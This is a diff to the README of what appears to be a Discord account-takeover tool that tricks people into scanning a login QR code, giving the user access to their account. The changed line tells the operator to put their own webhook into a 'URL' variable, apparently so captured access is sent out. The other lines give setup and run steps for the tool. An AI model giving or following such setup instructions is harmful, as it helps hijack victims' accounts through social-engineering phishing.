@@ -14,7 +14,7 @@ into scanning their Discord login QR Code, and gain access to their account. Use
 and make sure you click on the 'ADD TO PATH' option during
 the installation.
 
-2. Install the required modules > ```pip install -r requirements.txt``` or double click `pip_install_requirements.bat`
+2. Install the required modules > ```pip install -r requirements.txt``` or double click `pip_install_requirements.bat` also make sure to edit "URL" variable within the program to add your webhook!
 
 3. Type ```python QR_Generator.py``` in cmd to run or double click `run_script.bat`
 
